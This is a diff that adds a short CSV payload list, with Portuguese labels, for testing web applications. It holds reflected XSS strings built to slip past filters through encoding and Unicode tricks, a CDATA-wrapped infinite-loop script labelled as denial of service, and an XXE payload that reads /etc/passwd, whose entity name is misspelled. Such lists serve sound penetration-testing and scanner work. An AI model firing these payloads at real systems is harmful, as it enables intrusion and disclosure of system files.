@@ -1,0 +1,11 @@
+payload,attack,technique,objective,risk
+"""><STYLE>@import""javascript:alert('XSS')"";</STYLE>",XSS Refletido,CSS + import JS,Executar alert via CSS injection,Medium
+">""'><img%20src%3D%26%23x6a;…alert(%26quot;%20XSS%20Test%20Successful%26quot;)>",XSS Refletido,URL-Encoding + HTML entity evasion,Executar alert com codificação dupla,Medium
+>%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>,XSS Refletido,URL-Encoding parcial,Executar alert,Medium
+'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e',XSS Refletido,Unicode-Escape (UTF-16),Bypass filtros e executar alert,Medium
+""""";!--""<XSS>=&{()}",XSS Refletido,Injeção com caracteres especiais,Quebrar parser e injetar <XSS>,Low
+"<IMG SRC=""javascript:alert('XSS');"">",XSS Refletido,Tag IMG com atributo JS,Executar alert,Medium
+<script>alert('XSS')</script>,XSS Refletido,Tag <script> direta,Executar alert,High
+%3cscript%3ealert('XSS')%3c/script%3e,XSS Refletido,URL-Encoding completa,Executar alert,High
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>,XSS em XML/HTML,CDATA embedding,Executar loop infinito (DoS),High
+"<?xml version=""1.0""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><foo>&xee;</foo>",XXE,External Entity (Unix passwd),Exfiltrar /etc/passwd,Critical
